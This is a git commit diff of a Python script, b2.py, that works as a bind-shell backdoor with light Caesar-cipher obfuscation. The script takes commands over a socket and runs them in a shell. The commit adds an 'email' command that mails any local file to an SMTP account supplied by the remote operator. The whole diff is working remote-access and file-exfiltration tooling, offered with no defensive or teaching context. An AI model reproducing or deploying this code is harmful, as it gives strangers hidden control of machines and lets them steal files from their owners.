54bfc12f6efe28b1b9f9febe9a00e97fc863c318
孤独的帅哥杨 <87306964+ycy20090311@users.noreply.github.com>
2022-06-26 13:27:52 +0800

    Update b2.py

--- b2.py
+++ b2.py
@@ -1,27 +1,48 @@
-import socket,subprocess
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import socket,subprocess,smtplib
 
 def Caesar(i,string1):#凯撒密码加密与解密
-    string2 = ''
+    string2 = ""
     if i == 0:#加密
-        for a in string1:string2 = string2 + chr(ord(a)+319)
+        for a in string1:
+            string2 = string2 + chr(ord(a)+4)
     elif i == 1:#解密
-        for a in string1:string2 = string2 + chr(ord(a)-319)
+        for a in string1:
+            string2 = string2 + chr(ord(a)-4)
     return string2
 def Shell(cmd):#执行shell
     shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
     out = shell.stdout.read()
     err = shell.stderr.read()
-    if out == b'' and err == b'':#避免向套间字发送b''造成连接中断
-        out = b' '
+    out = out.decode()
+    err = err.decode()
+    if out == "" and err == "":#避免向套间字发送""造成套间字中断
+        out = " "
     return out+err
-
-if '__main__' == __name__:
+def Email(host,port,name,passwd,file1):
+    msg = MIMEMultipart()
+    file = MIMEText(open(file1,"rb").read(),"base64","utf-8")
+    file["Content-Type"] = "application/octet-stream"
+    file["Content-Disposition"] = "attachment;filename = " + file1
+    msg.attach(file)
+    smtp = smtplib.SMTP()
+    smtp.connect(host,port)
+    smtp.login(name,passwd)
+    smtp.sendmail(name,name,msg.as_string())
+    smtp.close()
+    return "OK"
+if "__main__" == __name__:
     t = socket.socket()
-    t.bind(('', 12345))
+    t.bind(("",int(sys.argv[1])))
     t.listen(1)
     c,ip = t.accept()
     while True:
-        cmd = Caesar(1,c.recv(2048).decode())
-        c.send(Caesar(0,Shell(cmd).decode()).encode())
+        cmd = Caesar(1,c.recv(2048).decode()).split(" ",1)
+        if cmd[0] == "shell":
+            c.send(Caesar(0,Shell(cmd[1])).encode())
+        elif cmd[0] == "email":
+           cmd = cmd[1].split()
+           c.send(Caesar(0,Email(cmd[0],cmd[1],cmd[2],cmd[3],cmd[4])).encode())
     c.close()
     t.close()
